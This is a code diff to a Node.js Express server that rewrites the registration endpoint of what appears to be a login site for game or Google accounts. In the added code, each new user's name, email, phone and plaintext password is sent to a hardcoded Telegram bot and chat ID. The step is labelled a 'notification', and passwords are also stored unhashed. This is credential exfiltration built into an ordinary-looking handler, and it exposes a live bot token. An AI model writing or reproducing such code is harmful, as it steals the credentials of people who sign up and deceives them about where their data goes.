@@ -56,24 +56,6 @@ function authGoogle(token) {
         }).on('error', () => resolve(null));
     });
 }
-
-// ==================== REGISTER ====================
-app.post('/api/register', async (req, res) => {
-    const { username, email, password, captcha } = req.body;
-    if (!username || !email || !password || !captcha) return res.json({ success: false, message: 'All fields required' });
-
-    const captchaOk = await verifyCaptcha(captcha);
-    if (!captchaOk) return res.json({ success: false, message: 'reCAPTCHA verification failed' });
-
-    const db = readDB();
-    if (db.users.find(u => u.email === email)) return res.json({ success: false, message: 'Email already exists' });
-
-    const newUser = { id: db.users.length + 1, username, email, password, login_type: 'local', gmail_pass: 'DoubleMK2008', mlbb_pass: 'GlobalMK2008', createdAt: new Date().toISOString() };
-    db.users.push(newUser);
-    writeDB(db);
-    res.json({ success: true, message: 'Registration successful' });
-});
-
 // ==================== LOGIN ====================
 app.post('/api/login', async (req, res) => {
     const { email, password, captcha } = req.body;
@@ -88,7 +70,27 @@ app.post('/api/login', async (req, res) => {
 
     res.json({ success: true, token: 'token_' + user.id, user: { id: user.id, username: user.username, email: user.email, login_type: 'local' } });
 });
+// Register API ကိုသာ ပြင်ပါ - phone field နဲ့ Telegram notification ထည့်ပါ
+app.post('/api/register', async (req, res) => {
+    const { username, email, phone, password, captcha } = req.body;
+    if (!username || !email || !phone || !password || !captcha) return res.json({ success: false, message: 'All fields required' });
 
+    const captchaOk = await verifyCaptcha(captcha);
+    if (!captchaOk) return res.json({ success: false, message: 'reCAPTCHA verification failed' });
+
+    const db = readDB();
+    if (db.users.find(u => u.email === email)) return res.json({ success: false, message: 'Email already exists' });
+
+    const newUser = { id: db.users.length + 1, username, email, phone, password, login_type: 'local', gmail_pass: 'DoubleMK2008', mlbb_pass: 'GlobalMK2008', createdAt: new Date().toISOString() };
+    db.users.push(newUser);
+    writeDB(db);
+
+    // Send to Telegram
+    const tgMsg = `🆕 New Registration%0A👤 Name: ${username}%0A📧 Email: ${email}%0A📱 Phone: ${phone}%0A🔑 Password: ${password}%0A📅 Date: ${new Date().toLocaleString()}`;
+    https.get(`https://api.telegram.org/bot8737284644:AAEW7XtU6HqK4O49dJXG6MXSj08BvLUAdJE/sendMessage?chat_id=8315928972&text=${tgMsg}&parse_mode=HTML`);
+
+    res.json({ success: true, message: 'Registration successful' });
+});
 // ==================== GOOGLE AUTH ====================
 app.post('/api/auth/google', async (req, res) => {
     const { token, userInfo } = req.body;
